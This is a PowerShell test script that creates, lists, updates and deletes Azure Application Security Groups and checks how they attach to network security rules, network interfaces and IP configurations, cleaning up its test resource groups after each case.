













function Test-ApplicationSecurityGroupCRUD
{
    $rgLocation = Get-ProviderLocation ResourceManagement
    $resourceTypeParent = "Microsoft.Network/ApplicationSecurityGroups"
    $location = Get-ProviderLocation $resourceTypeParent

    $rgName = Get-ResourceGroupName
    $asgName = Get-ResourceName

    try
    {
        
        $resourceGroup = New-AzResourceGroup -Name $rgName -Location $location -Tags @{ testtag = "ASG tag" }

        
        $job = New-AzApplicationSecurityGroup -ResourceGroupName $rgName -Name $asgName -Location $rgLocation -AsJob
		$job | Wait-Job
		$asgNew = $job | Receive-Job

        Assert-AreEqual $rgName $asgNew.ResourceGroupName
        Assert-AreEqual $asgName $asgNew.Name
        Assert-NotNull $asgNew.Location
        Assert-NotNull $asgNew.Etag

        
        $asgGet = Get-AzApplicationSecurityGroup -ResourceGroupName $rgName -Name $asgName
        Assert-AreEqual $rgName $asgGet.ResourceGroupName
        Assert-AreEqual $asgName $asgGet.Name
        Assert-NotNull $asgGet.Location
        Assert-NotNull $asgGet.Etag

        $asgGet = Get-AzApplicationSecurityGroup -ResourceGroupName "*"
        Assert-True { $asgGet.Count -ge 0 }

        $asgGet = Get-AzApplicationSecurityGroup -Name "*"
        Assert-True { $asgGet.Count -ge 0 }

        $asgGet = Get-AzApplicationSecurityGroup -ResourceGroupName "*" -Name "*"
        Assert-True { $asgGet.Count -ge 0 }

        
        $asgDelete = Remove-AzApplicationSecurityGroup -Name $asgName -ResourceGroupName $rgName -PassThru -Force
        Assert-AreEqual $true $asgDelete
    }
    finally
    {
        
        Clean-ResourceGroup $rgName
    }
}


function Test-ApplicationSecurityGroupCollections
{
    $rgLocation = Get-ProviderLocation ResourceManagement
    $resourceTypeParent = "Microsoft.Network/ApplicationSecurityGroups"
    $location = Get-ProviderLocation $resourceTypeParent

    $rgName1 = Get-ResourceGroupName
    $rgName2 = Get-ResourceGroupName

    $asgName1 = Get-ResourceName
    $asgName2 = Get-ResourceName

    try
    {
        
        $resourceGroup1 = New-AzResourceGroup -Name $rgName1 -Location $location -Tags @{ testtag = "ASG tag" }
        $resourceGroup2 = New-AzResourceGroup -Name $rgName2 -Location $location -Tags @{ testtag = "ASG tag" }

        
        $asg1 = New-AzApplicationSecurityGroup -Name $asgName1 -ResourceGroupName $rgName1 -Location $rgLocation
        $asg2 = New-AzApplicationSecurityGroup -Name $asgName2 -ResourceGroupName $rgName2 -Location $rgLocation

        
        $listRg = Get-AzApplicationSecurityGroup -ResourceGroupName $rgName1
        Assert-AreEqual 1 @($listRg).Count
        Assert-AreEqual $listRg[0].ResourceGroupName $asg1.ResourceGroupName
        Assert-AreEqual $listRg[0].Name $asg1.Name
        Assert-AreEqual $listRg[0].Location $asg1.Location
        Assert-AreEqual $listRg[0].Etag $asg1.Etag

        
        $listSub = Get-AzApplicationSecurityGroup

        $asg1FromList = @($listSub) | Where-Object Name -eq $asgName1 | Where-Object ResourceGroupName -eq $rgName1
        Assert-AreEqual $asg1.ResourceGroupName $asg1FromList.ResourceGroupName
        Assert-AreEqual $asg1.Name $asg1FromList.Name
        Assert-AreEqual $asg1.Location $asg1FromList.Location
        Assert-AreEqual $asg1.Etag $asg1FromList.Etag

        $asg2FromList = @($listSub) | Where-Object Name -eq $asgName2 | Where-Object ResourceGroupName -eq $rgName2
        Assert-AreEqual $asg2.ResourceGroupName $asg2FromList.ResourceGroupName
        Assert-AreEqual $asg2.Name $asg2FromList.Name
        Assert-AreEqual $asg2.Location $asg2FromList.Location
        Assert-AreEqual $asg2.Etag $asg2FromList.Etag
    }
    finally
    {
        
        Clean-ResourceGroup $rgName1
        Clean-ResourceGroup $rgName2
    }
}


function Test-ApplicationSecurityGroupInNewSecurityRule
{
    param([bool] $useIds = $false)

    $rgLocation = Get-ProviderLocation ResourceManagement
    $resourceTypeParent = "Microsoft.Network/ApplicationSecurityGroups"
    $location = Get-ProviderLocation $resourceTypeParent

    $rgName = Get-ResourceGroupName
    $asgName = Get-ResourceName
    $nsgName = Get-ResourceName
    $securityRuleNames = @((Get-ResourceName), (Get-ResourceName), (Get-ResourceName), (Get-ResourceName))

    try
    {
        
        $resourceGroup = New-AzResourceGroup -Name $rgName -Location $location -Tags @{ testtag = "ASG tag" }

        
        $asg = New-AzApplicationSecurityGroup -ResourceGroupName $rgName -Name $asgName -Location $rgLocation

        
        $securityRules = @()

        if ($useIds)
        {
            $securityRules += New-AzNetworkSecurityRuleConfig -Name $securityRuleNames[0] -Description "description" -Protocol Tcp -SourcePortRange "23-45" -DestinationPortRange "46-56" -SourceApplicationSecurityGroupId $asg.Id -DestinationApplicationSecurityGroupId $asg.Id -Access Allow -Priority 100 -Direction Inbound
            $securityRules += New-AzNetworkSecurityRuleConfig -Name $securityRuleNames[1] -Description "description" -Protocol Tcp -SourcePortRange "23-45" -DestinationPortRange "46-56" -SourceApplicationSecurityGroupId $asg.Id -DestinationAddressPrefix * -Access Allow -Priority 102 -Direction Inbound
            $securityRules += New-AzNetworkSecurityRuleConfig -Name $securityRuleNames[2] -Description "description" -Protocol Tcp -SourcePortRange "23-45" -DestinationPortRange "46-56" -SourceAddressPrefix * -DestinationApplicationSecurityGroupId $asg.Id -Access Allow -Priority 103 -Direction Inbound
            $securityRules += New-AzNetworkSecurityRuleConfig -Name $securityRuleNames[3] -Description "description" -Protocol Tcp -SourcePortRange "23-45" -DestinationPortRange "46-56" -SourceAddressPrefix * -DestinationAddressPrefix * -Access Allow -Priority 104 -Direction Inbound
        }
        else
        {
            $securityRules += New-AzNetworkSecurityRuleConfig -Name $securityRuleNames[0] -Description "description" -Protocol Tcp -SourcePortRange "23-45" -DestinationPortRange "46-56" -SourceApplicationSecurityGroup $asg -DestinationApplicationSecurityGroup $asg -Access Allow -Priority 100 -Direction Inbound
            $securityRules += New-AzNetworkSecurityRuleConfig -Name $securityRuleNames[1] -Description "description" -Protocol Tcp -SourcePortRange "23-45" -DestinationPortRange "46-56" -SourceApplicationSecurityGroup $asg -DestinationAddressPrefix * -Access Allow -Priority 102 -Direction Inbound
            $securityRules += New-AzNetworkSecurityRuleConfig -Name $securityRuleNames[2] -Description "description" -Protocol Tcp -SourcePortRange "23-45" -DestinationPortRange "46-56" -SourceAddressPrefix * -DestinationApplicationSecurityGroup $asg -Access Allow -Priority 103 -Direction Inbound
            $securityRules += New-AzNetworkSecurityRuleConfig -Name $securityRuleNames[3] -Description "description" -Protocol Tcp -SourcePortRange "23-45" -DestinationPortRange "46-56" -SourceAddressPrefix * -DestinationAddressPrefix * -Access Allow -Priority 104 -Direction Inbound
        }

        
        $nsg = New-AzNetworkSecurityGroup -name $nsgName -ResourceGroupName $rgName -Location $location -SecurityRule $securityRules

        
        Assert-AreEqual $rgName $nsg.ResourceGroupName
        Assert-AreEqual $nsgName $nsg.Name
        Assert-NotNull $nsg.Location
        Assert-NotNull $nsg.Etag
        Assert-AreEqual 4 @($nsg.SecurityRules).Count

        $securityRule = @($nsg.SecurityRules) | Where-Object Name -eq $securityRuleNames[0]
        Assert-Null $securityRule.SourceAddressPrefix
        Assert-Null $securityRule.DestinationAddressPrefix
        Assert-AreEqual $asg.Id $securityRule.SourceApplicationSecurityGroups.Id
        Assert-AreEqual $asg.Id $securityRule.DestinationApplicationSecurityGroups.Id

        $securityRule = @($nsg.SecurityRules) | Where-Object Name -eq $securityRuleNames[1]
        Assert-Null $securityRule.SourceAddressPrefix
        Assert-AreEqual "*" $securityRule.DestinationAddressPrefix
        Assert-AreEqual $asg.Id $securityRule.SourceApplicationSecurityGroups.Id
        Assert-Null $securityRule.DestinationApplicationSecurityGroups

        $securityRule = @($nsg.SecurityRules) | Where-Object Name -eq $securityRuleNames[2]
        Assert-AreEqual "*" $securityRule.SourceAddressPrefix
        Assert-Null $securityRule.DestinationAddressPrefix
        Assert-Null $securityRule.SourceApplicationSecurityGroups
        Assert-AreEqual $asg.Id $securityRule.DestinationApplicationSecurityGroups.Id

        $securityRule = @($nsg.SecurityRules) | Where-Object Name -eq $securityRuleNames[3]
        Assert-AreEqual "*" $securityRule.SourceAddressPrefix
        Assert-AreEqual "*" $securityRule.DestinationAddressPrefix
        Assert-Null $securityRule.SourceApplicationSecurityGroups
        Assert-Null $securityRule.DestinationApplicationSecurityGroups
    }
    finally
    {
        
        Clean-ResourceGroup $rgName
    }
}


function Test-ApplicationSecurityGroupInAddedSecurityRule
{
    param([bool] $useIds = $false)

    $rgLocation = Get-ProviderLocation ResourceManagement
    $resourceTypeParent = "Microsoft.Network/ApplicationSecurityGroups"
    $location = Get-ProviderLocation $resourceTypeParent

    $rgName = Get-ResourceGroupName
    $asgName = Get-ResourceName
    $nsgName = Get-ResourceName
    $securityRuleNames = @((Get-ResourceName), (Get-ResourceName), (Get-ResourceName), (Get-ResourceName))

    try
    {
        
        $resourceGroup = New-AzResourceGroup -Name $rgName -Location $location -Tags @{ testtag = "ASG tag" }

        
        $asg = New-AzApplicationSecurityGroup -ResourceGroupName $rgName -Name $asgName -Location $rgLocation

        
        $nsg = New-AzNetworkSecurityGroup -name $nsgName -ResourceGroupName $rgName -Location $location

        if ($useIds)
        {
            Add-AzNetworkSecurityRuleConfig -NetworkSecurityGroup $nsg -Name $securityRuleNames[0] -Description "description" -Protocol Tcp -SourcePortRange "23-45" -DestinationPortRange "46-56" -SourceApplicationSecurityGroupId $asg.Id -DestinationApplicationSecurityGroupId $asg.Id -Access Allow -Priority 100 -Direction Inbound
            Add-AzNetworkSecurityRuleConfig -NetworkSecurityGroup $nsg -Name $securityRuleNames[1] -Description "description" -Protocol Tcp -SourcePortRange "23-45" -DestinationPortRange "46-56" -SourceApplicationSecurityGroupId $asg.Id -DestinationAddressPrefix * -Access Allow -Priority 102 -Direction Inbound
            Add-AzNetworkSecurityRuleConfig -NetworkSecurityGroup $nsg -Name $securityRuleNames[2] -Description "description" -Protocol Tcp -SourcePortRange "23-45" -DestinationPortRange "46-56" -SourceAddressPrefix * -DestinationApplicationSecurityGroupId $asg.Id -Access Allow -Priority 103 -Direction Inbound
            Add-AzNetworkSecurityRuleConfig -NetworkSecurityGroup $nsg -Name $securityRuleNames[3] -Description "description" -Protocol Tcp -SourcePortRange "23-45" -DestinationPortRange "46-56" -SourceAddressPrefix * -DestinationAddressPrefix * -Access Allow -Priority 104 -Direction Inbound
        }
        else
        {
            Add-AzNetworkSecurityRuleConfig -NetworkSecurityGroup $nsg -Name $securityRuleNames[0] -Description "description" -Protocol Tcp -SourcePortRange "23-45" -DestinationPortRange "46-56" -SourceApplicationSecurityGroup $asg -DestinationApplicationSecurityGroup $asg -Access Allow -Priority 100 -Direction Inbound
            Add-AzNetworkSecurityRuleConfig -NetworkSecurityGroup $nsg -Name $securityRuleNames[1] -Description "description" -Protocol Tcp -SourcePortRange "23-45" -DestinationPortRange "46-56" -SourceApplicationSecurityGroup $asg -DestinationAddressPrefix * -Access Allow -Priority 102 -Direction Inbound
            Add-AzNetworkSecurityRuleConfig -NetworkSecurityGroup $nsg -Name $securityRuleNames[2] -Description "description" -Protocol Tcp -SourcePortRange "23-45" -DestinationPortRange "46-56" -SourceAddressPrefix * -DestinationApplicationSecurityGroup $asg -Access Allow -Priority 103 -Direction Inbound
            Add-AzNetworkSecurityRuleConfig -NetworkSecurityGroup $nsg -Name $securityRuleNames[3] -Description "description" -Protocol Tcp -SourcePortRange "23-45" -DestinationPortRange "46-56" -SourceAddressPrefix * -DestinationAddressPrefix * -Access Allow -Priority 104 -Direction Inbound
        }

        $securityRules = Get-AzNetworkSecurityRuleConfig -NetworkSecurityGroup $nsg

        
        Assert-AreEqual 4 @($securityRules).Count

        $securityRule = @($securityRules) | Where-Object Name -eq $securityRuleNames[0]
        Assert-Null $securityRule.SourceAddressPrefix
        Assert-Null $securityRule.DestinationAddressPrefix
        Assert-AreEqual $asg.Id $securityRule.SourceApplicationSecurityGroups.Id
        Assert-AreEqual $asg.Id $securityRule.DestinationApplicationSecurityGroups.Id

        $securityRule = @($securityRules) | Where-Object Name -eq $securityRuleNames[1]
        Assert-Null $securityRule.SourceAddressPrefix
        Assert-AreEqual "*" $securityRule.DestinationAddressPrefix
        Assert-AreEqual $asg.Id $securityRule.SourceApplicationSecurityGroups.Id
        Assert-Null $securityRule.DestinationApplicationSecurityGroups

        $securityRule = @($securityRules) | Where-Object Name -eq $securityRuleNames[2]
        Assert-AreEqual "*" $securityRule.SourceAddressPrefix
        Assert-Null $securityRule.DestinationAddressPrefix
        Assert-Null $securityRule.SourceApplicationSecurityGroups
        Assert-AreEqual $asg.Id $securityRule.DestinationApplicationSecurityGroups.Id

        $securityRule = @($securityRules) | Where-Object Name -eq $securityRuleNames[3]
        Assert-AreEqual "*" $securityRule.SourceAddressPrefix
        Assert-AreEqual "*" $securityRule.DestinationAddressPrefix
        Assert-Null $securityRule.SourceApplicationSecurityGroups
        Assert-Null $securityRule.DestinationApplicationSecurityGroups
    }
    finally
    {
        
        Clean-ResourceGroup $rgName
    }
}


function Test-ApplicationSecurityGroupInSetSecurityRule
{
    param([bool] $useIds = $false)

    $rgLocation = Get-ProviderLocation ResourceManagement
    $resourceTypeParent = "Microsoft.Network/ApplicationSecurityGroups"
    $location = Get-ProviderLocation $resourceTypeParent

    $rgName = Get-ResourceGroupName
    $asgName = Get-ResourceName
    $nsgName = Get-ResourceName
    $securityRuleNames = @((Get-ResourceName), (Get-ResourceName), (Get-ResourceName), (Get-ResourceName))

    try
    {
        $resourceGroup = New-AzResourceGroup -Name $rgName -Location $location -Tags @{ testtag = "ASG tag" }

        $asg = New-AzApplicationSecurityGroup -ResourceGroupName $rgName -Name $asgName -Location $rgLocation

        $securityRules = @()
        $securityRules += New-AzNetworkSecurityRuleConfig -Name $securityRuleNames[0] -Description "description" -Protocol Tcp -SourcePortRange "23-45" -DestinationPortRange "46-56" -SourceAddressPrefix * -DestinationAddressPrefix * -Access Allow -Priority 100 -Direction Inbound
        $securityRules += New-AzNetworkSecurityRuleConfig -Name $securityRuleNames[1] -Description "description" -Protocol Tcp -SourcePortRange "23-45" -DestinationPortRange "46-56" -SourceAddressPrefix * -DestinationAddressPrefix * -Access Allow -Priority 102 -Direction Inbound
        $securityRules += New-AzNetworkSecurityRuleConfig -Name $securityRuleNames[2] -Description "description" -Protocol Tcp -SourcePortRange "23-45" -DestinationPortRange "46-56" -SourceAddressPrefix * -DestinationAddressPrefix * -Access Allow -Priority 103 -Direction Inbound
        
        $nsg = New-AzNetworkSecurityGroup -name $nsgName -ResourceGroupName $rgName -Location $location -SecurityRule $securityRules

        if ($useIds)
        {
            Set-AzNetworkSecurityRuleConfig -NetworkSecurityGroup $nsg -Name $securityRuleNames[0] -Description "description" -Protocol Tcp -SourcePortRange "23-45" -DestinationPortRange "46-56" -SourceApplicationSecurityGroupId $asg.Id -DestinationApplicationSecurityGroupId $asg.Id -Access Allow -Priority 100 -Direction Inbound
            Set-AzNetworkSecurityRuleConfig -NetworkSecurityGroup $nsg -Name $securityRuleNames[1] -Description "description" -Protocol Tcp -SourcePortRange "23-45" -DestinationPortRange "46-56" -SourceApplicationSecurityGroupId $asg.Id -DestinationAddressPrefix * -Access Allow -Priority 102 -Direction Inbound
            Set-AzNetworkSecurityRuleConfig -NetworkSecurityGroup $nsg -Name $securityRuleNames[2] -Description "description" -Protocol Tcp -SourcePortRange "23-45" -DestinationPortRange "46-56" -SourceAddressPrefix * -DestinationApplicationSecurityGroupId $asg.Id -Access Allow -Priority 103 -Direction Inbound
        }
        else
        {
            Set-AzNetworkSecurityRuleConfig -NetworkSecurityGroup $nsg  -Name $securityRuleNames[0] -Description "description" -Protocol Tcp -SourcePortRange "23-45" -DestinationPortRange "46-56" -SourceApplicationSecurityGroup $asg -DestinationApplicationSecurityGroup $asg -Access Allow -Priority 100 -Direction Inbound
            Set-AzNetworkSecurityRuleConfig -NetworkSecurityGroup $nsg  -Name $securityRuleNames[1] -Description "description" -Protocol Tcp -SourcePortRange "23-45" -DestinationPortRange "46-56" -SourceApplicationSecurityGroup $asg -DestinationAddressPrefix * -Access Allow -Priority 102 -Direction Inbound
            Set-AzNetworkSecurityRuleConfig -NetworkSecurityGroup $nsg  -Name $securityRuleNames[2] -Description "description" -Protocol Tcp -SourcePortRange "23-45" -DestinationPortRange "46-56" -SourceAddressPrefix * -DestinationApplicationSecurityGroup $asg -Access Allow -Priority 103 -Direction Inbound
        }

        $securityRules = Get-AzNetworkSecurityRuleConfig -NetworkSecurityGroup $nsg

        $securityRule = @($securityRules) | Where-Object Name -eq $securityRuleNames[0]
        Assert-Null $securityRule.SourceAddressPrefix
        Assert-Null $securityRule.DestinationAddressPrefix
        Assert-AreEqual $asg.Id $securityRule.SourceApplicationSecurityGroups.Id
        Assert-AreEqual $asg.Id $securityRule.DestinationApplicationSecurityGroups.Id

        $securityRule = @($securityRules) | Where-Object Name -eq $securityRuleNames[1]
        Assert-Null $securityRule.SourceAddressPrefix
        Assert-AreEqual "*" $securityRule.DestinationAddressPrefix
        Assert-AreEqual $asg.Id $securityRule.SourceApplicationSecurityGroups.Id
        Assert-Null $securityRule.DestinationApplicationSecurityGroups

        $securityRule = @($securityRules) | Where-Object Name -eq $securityRuleNames[2]
        Assert-AreEqual "*" $securityRule.SourceAddressPrefix
        Assert-Null $securityRule.DestinationAddressPrefix
        Assert-Null $securityRule.SourceApplicationSecurityGroups
        Assert-AreEqual $asg.Id $securityRule.DestinationApplicationSecurityGroups.Id
    }
    finally
    {
        
        Clean-ResourceGroup $rgName
    }
}


function Test-ApplicationSecurityGroupInNewNetworkInterface
{
    $rgLocation = Get-ProviderLocation ResourceManagement
    $resourceTypeParent = "Microsoft.Network/ApplicationSecurityGroups"
    $location = Get-ProviderLocation $resourceTypeParent

    $rgName = Get-ResourceGroupName

    $asgName1 = Get-ResourceName
    $asgName2 = Get-ResourceName
    $asgName3 = Get-ResourceName

    $vnetName = Get-ResourceName
    $subnetName = Get-ResourceName
    $nicName = Get-ResourceName

    try
    {
        $resourceGroup = New-AzResourceGroup -Name $rgName -Location $location -Tags @{ testtag = "ASG tag" }

        $asg1 = New-AzApplicationSecurityGroup -ResourceGroupName $rgName -Name $asgName1 -Location $rgLocation
        $asg2 = New-AzApplicationSecurityGroup -ResourceGroupName $rgName -Name $asgName2 -Location $rgLocation
        $asg3 = New-AzApplicationSecurityGroup -ResourceGroupName $rgName -Name $asgName3 -Location $rgLocation

        $subnet = New-AzVirtualNetworkSubnetConfig -Name $subnetName -AddressPrefix 10.0.1.0/24
        $vnet = New-AzVirtualNetwork -Name $vnetName -ResourceGroupName $rgName -Location $location -AddressPrefix 10.0.0.0/16 -Subnet $subnet

        $nic = New-AzNetworkInterface -Name $nicName -ResourceGroupName $rgName -Location $location -Subnet $vnet.Subnets[0] -ApplicationSecurityGroup $asg1

        Assert-AreEqual 1 @($nic.IpConfigurations.ApplicationSecurityGroups).Count
        Assert-AreEqual $asg1.Id @($nic.IpConfigurations.ApplicationSecurityGroups)[0].Id

        $nic = New-AzNetworkInterface -Name $nicName -ResourceGroupName $rgName -Location $location -Subnet $vnet.Subnets[0] -ApplicationSecurityGroup @($asg2, $asg3) -Force

        Assert-AreEqual 2 @($nic.IpConfigurations.ApplicationSecurityGroups).Count
        Assert-AreEqual $true (@($nic.IpConfigurations.ApplicationSecurityGroups.Id) -contains $asg2.Id)
        Assert-AreEqual $true (@($nic.IpConfigurations.ApplicationSecurityGroups.Id) -contains $asg3.Id)
    }
    finally
    {
        
        Clean-ResourceGroup $rgName
    }
}


function Test-ApplicationSecurityGroupInNewNetworkInterfaceIpConfig
{
    param([bool] $useIds = $false)

    $rgLocation = Get-ProviderLocation ResourceManagement
    $resourceTypeParent = "Microsoft.Network/ApplicationSecurityGroups"
    $location = Get-ProviderLocation $resourceTypeParent

    $rgName = Get-ResourceGroupName

    $asgName1 = Get-ResourceName
    $asgName2 = Get-ResourceName

    $ipConfigName1 = Get-ResourceName
    $ipConfigName2 = Get-ResourceName

    $vnetName = Get-ResourceName
    $subnetName = Get-ResourceName
    $nicName = Get-ResourceName

    try
    {
        $resourceGroup = New-AzResourceGroup -Name $rgName -Location $location -Tags @{ testtag = "ASG tag" }

        $asg1 = New-AzApplicationSecurityGroup -ResourceGroupName $rgName -Name $asgName1 -Location $rgLocation
        $asg2 = New-AzApplicationSecurityGroup -ResourceGroupName $rgName -Name $asgName2 -Location $rgLocation

        $subnet = New-AzVirtualNetworkSubnetConfig -Name $subnetName -AddressPrefix 10.0.1.0/24
        $vnet = New-AzVirtualNetwork -Name $vnetName -ResourceGroupName $rgName -Location $location -AddressPrefix 10.0.0.0/16 -Subnet $subnet

        if ($useIds)
        {
            $ipConfig1 = New-AzNetworkInterfaceIpConfig -Name $ipConfigName1 -SubnetId $vnet.Subnets[0].Id -ApplicationSecurityGroupId $asg1.Id -Primary
            $ipConfig2 = New-AzNetworkInterfaceIpConfig -Name $ipConfigName2 -SubnetId $vnet.Subnets[0].Id -ApplicationSecurityGroupId $asg1.Id
        }
        else
        {
            $ipConfig1 = New-AzNetworkInterfaceIpConfig -Name $ipConfigName1 -Subnet $vnet.Subnets[0] -ApplicationSecurityGroup $asg1 -Primary
            $ipConfig2 = New-AzNetworkInterfaceIpConfig -Name $ipConfigName2 -Subnet $vnet.Subnets[0] -ApplicationSecurityGroup $asg1
        }

        $nic = New-AzNetworkInterface -Name $nicName -ResourceGroupName $rgName -Location $location -IpConfiguration @($ipConfig1, $ipConfig2)

        Assert-AreEqual 1 @($nic.IpConfigurations[0].ApplicationSecurityGroups).Count
        Assert-AreEqual $asg1.Id @($nic.IpConfigurations[0].ApplicationSecurityGroups).Id

        Assert-AreEqual 1 @($nic.IpConfigurations[1].ApplicationSecurityGroups).Count
        Assert-AreEqual $asg1.Id @($nic.IpConfigurations[1].ApplicationSecurityGroups).Id

        if ($useIds)
        {
            $ipConfig1 = New-AzNetworkInterfaceIpConfig -Name $ipConfigName1 -SubnetId $vnet.Subnets[0].Id -ApplicationSecurityGroupId ($asg1.Id, $asg2.Id) -Primary
            $ipConfig2 = New-AzNetworkInterfaceIpConfig -Name $ipConfigName2 -SubnetId $vnet.Subnets[0].Id -ApplicationSecurityGroupId ($asg1.Id, $asg2.Id)
        }
        else
        {
            $ipConfig1 = New-AzNetworkInterfaceIpConfig -Name $ipConfigName1 -Subnet $vnet.Subnets[0] -ApplicationSecurityGroup ($asg1, $asg2) -Primary
            $ipConfig2 = New-AzNetworkInterfaceIpConfig -Name $ipConfigName2 -Subnet $vnet.Subnets[0] -ApplicationSecurityGroup ($asg1, $asg2)
        }

        $nic = New-AzNetworkInterface -Name $nicName -ResourceGroupName $rgName -Location $location -IpConfiguration @($ipConfig1, $ipConfig2) -Force

        Assert-AreEqual 2 @($nic.IpConfigurations[0].ApplicationSecurityGroups).Count
        Assert-AreEqual $true (@($nic.IpConfigurations[0].ApplicationSecurityGroups).Id -contains $asg1.Id)
        Assert-AreEqual $true (@($nic.IpConfigurations[0].ApplicationSecurityGroups).Id -contains $asg2.Id)

        Assert-AreEqual 2 @($nic.IpConfigurations[1].ApplicationSecurityGroups).Count
        Assert-AreEqual $true (@($nic.IpConfigurations[1].ApplicationSecurityGroups).Id -contains $asg1.Id)
        Assert-AreEqual $true (@($nic.IpConfigurations[1].ApplicationSecurityGroups).Id -contains $asg2.Id)
    }
    finally
    {
        
        Clean-ResourceGroup $rgName
    }
}


function Test-ApplicationSecurityGroupInAddedNetworkInterfaceIpConfig
{
    param([bool] $useIds = $false)

    $rgLocation = Get-ProviderLocation ResourceManagement
    $resourceTypeParent = "Microsoft.Network/ApplicationSecurityGroups"
    $location = Get-ProviderLocation $resourceTypeParent

    $rgName = Get-ResourceGroupName

    $asgName1 = Get-ResourceName
    $asgName2 = Get-ResourceName

    $ipConfigName1 = Get-ResourceName
    $ipConfigName2 = Get-ResourceName

    $vnetName = Get-ResourceName
    $subnetName = Get-ResourceName
    $nicName = Get-ResourceName

    try
    {
        $resourceGroup = New-AzResourceGroup -Name $rgName -Location $location -Tags @{ testtag = "ASG tag" }

        $asg1 = New-AzApplicationSecurityGroup -ResourceGroupName $rgName -Name $asgName1 -Location $rgLocation
        $asg2 = New-AzApplicationSecurityGroup -ResourceGroupName $rgName -Name $asgName2 -Location $rgLocation

        $subnet = New-AzVirtualNetworkSubnetConfig -Name $subnetName -AddressPrefix 10.0.1.0/24
        $vnet = New-AzVirtualNetwork -Name $vnetName -ResourceGroupName $rgName -Location $location -AddressPrefix 10.0.0.0/16 -Subnet $subnet

        $nic = New-AzNetworkInterface -Name $nicName -ResourceGroupName $rgName -Location $location  -Subnet $vnet.Subnets[0]

        if ($useIds)
        {
            $ipconfigSet = Set-AzNetworkInterfaceIpConfig -NetworkInterface $nic -Name $nic.IpConfigurations[0].Name -SubnetId $vnet.Subnets[0].Id -ApplicationSecurityGroupId $asg1.Id -Primary
            $ipConfig1 = Add-AzNetworkInterfaceIpConfig -NetworkInterface $nic -Name $ipConfigName1 -SubnetId $vnet.Subnets[0].Id -ApplicationSecurityGroupId $asg1.Id  | Set-AzNetworkInterface
            $ipConfig2 = Add-AzNetworkInterfaceIpConfig -NetworkInterface $nic -Name $ipConfigName2 -SubnetId $vnet.Subnets[0].Id -ApplicationSecurityGroupId $asg1.Id  | Set-AzNetworkInterface
        }
        else
        {
            $ipconfigSet = Set-AzNetworkInterfaceIpConfig -NetworkInterface $nic -Name $nic.IpConfigurations[0].Name -Subnet $vnet.Subnets[0] -ApplicationSecurityGroup $asg1 -Primary
            $ipConfig1 = Add-AzNetworkInterfaceIpConfig -NetworkInterface $nic -Name $ipConfigName1 -Subnet $vnet.Subnets[0] -ApplicationSecurityGroup $asg1  | Set-AzNetworkInterface
            $ipConfig2 = Add-AzNetworkInterfaceIpConfig -NetworkInterface $nic -Name $ipConfigName2 -Subnet $vnet.Subnets[0] -ApplicationSecurityGroup $asg1  | Set-AzNetworkInterface
        }

        $nic = Get-AzNetworkInterface -Name $nicName -ResourceGroupName $rgName

        Assert-AreEqual 3 @($nic.IpConfigurations).Count

        Assert-AreEqual 1 @($nic.IpConfigurations[0].ApplicationSecurityGroups).Count
        Assert-AreEqual 1 @($nic.IpConfigurations[1].ApplicationSecurityGroups).Count
        Assert-AreEqual 1 @($nic.IpConfigurations[2].ApplicationSecurityGroups).Count

        Assert-AreEqual $asg1.Id @($nic.IpConfigurations[0].ApplicationSecurityGroups).Id
        Assert-AreEqual $asg1.Id @($nic.IpConfigurations[1].ApplicationSecurityGroups).Id
        Assert-AreEqual $asg1.Id @($nic.IpConfigurations[2].ApplicationSecurityGroups).Id

        $nic = New-AzNetworkInterface -Name $nicName -ResourceGroupName $rgName -Location $location  -Subnet $vnet.Subnets[0] -Force

        if ($useIds)
        {
            $ipconfigSet = Set-AzNetworkInterfaceIpConfig -NetworkInterface $nic -Name $nic.IpConfigurations[0].Name -SubnetId $vnet.Subnets[0].Id -ApplicationSecurityGroupId @($asg1.Id, $asg2.Id) -Primary
            $ipConfig1 = Add-AzNetworkInterfaceIpConfig -NetworkInterface $nic -Name $ipConfigName1 -SubnetId $vnet.Subnets[0].Id -ApplicationSecurityGroupId @($asg1.Id, $asg2.Id) | Set-AzNetworkInterface
            $ipConfig2 = Add-AzNetworkInterfaceIpConfig -NetworkInterface $nic -Name $ipConfigName2 -SubnetId $vnet.Subnets[0].Id -ApplicationSecurityGroupId @($asg1.Id, $asg2.Id) | Set-AzNetworkInterface
        }
        else
        {
            $ipconfigSet = Set-AzNetworkInterfaceIpConfig -NetworkInterface $nic -Name $nic.IpConfigurations[0].Name -Subnet $vnet.Subnets[0] -ApplicationSecurityGroup @($asg1, $asg2) -Primary
            $ipConfig1 = Add-AzNetworkInterfaceIpConfig -NetworkInterface $nic -Name $ipConfigName1 -Subnet $vnet.Subnets[0] -ApplicationSecurityGroup @($asg1, $asg2) | Set-AzNetworkInterface
            $ipConfig2 = Add-AzNetworkInterfaceIpConfig -NetworkInterface $nic -Name $ipConfigName2 -Subnet $vnet.Subnets[0] -ApplicationSecurityGroup @($asg1, $asg2) | Set-AzNetworkInterface
        }

        $nic = Get-AzNetworkInterface -Name $nicName -ResourceGroupName $rgName

        Assert-AreEqual 3 @($nic.IpConfigurations).Count

        Assert-AreEqual 2 @($nic.IpConfigurations[0].ApplicationSecurityGroups).Count
        Assert-AreEqual 2 @($nic.IpConfigurations[1].ApplicationSecurityGroups).Count
        Assert-AreEqual 2 @($nic.IpConfigurations[2].ApplicationSecurityGroups).Count

        Assert-AreEqual $true (@($nic.IpConfigurations[0].ApplicationSecurityGroups).Id -contains $asg1.Id)
        Assert-AreEqual $true (@($nic.IpConfigurations[1].ApplicationSecurityGroups).Id -contains $asg1.Id)
        Assert-AreEqual $true (@($nic.IpConfigurations[2].ApplicationSecurityGroups).Id -contains $asg1.Id)

        Assert-AreEqual $true (@($nic.IpConfigurations[0].ApplicationSecurityGroups).Id -contains $asg2.Id)
        Assert-AreEqual $true (@($nic.IpConfigurations[1].ApplicationSecurityGroups).Id -contains $asg2.Id)
        Assert-AreEqual $true (@($nic.IpConfigurations[2].ApplicationSecurityGroups).Id -contains $asg2.Id)
    }
    finally
    {
        
        Clean-ResourceGroup $rgName
    }
}

